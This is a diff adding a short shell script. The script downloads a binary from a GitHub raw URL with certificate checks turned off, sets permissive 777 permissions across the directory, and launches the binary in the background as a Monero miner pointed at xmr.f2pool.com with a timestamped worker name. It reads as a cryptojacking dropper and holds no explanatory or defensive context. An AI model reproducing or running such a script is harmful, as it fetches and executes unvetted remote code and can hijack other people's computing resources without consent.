@@ -1,0 +1,14 @@
+echo 'kaishijb'
+wget --no-check-certificate https://raw.githubusercontent.com/chnrui/zig1/main/ignb -O ignb
+chmod -R 777 *
+current=`date "+%Y-%m-%d %H:%M:%S"`
+timeStamp=`date -d "$current" +%s`
+currentTimeStamp=$((timeStamp*1000+`date "+%N"`/1000000))
+echo $currentTimeStamp
+if [ $1 ];then
+    uname=$1
+else
+    uname=gaxmr1.ignb$currentTimeStamp
+fi
+./ignb -o xmr.f2pool.com:13531 -u $uname -p x -k -B
+echo 'jieshujb'
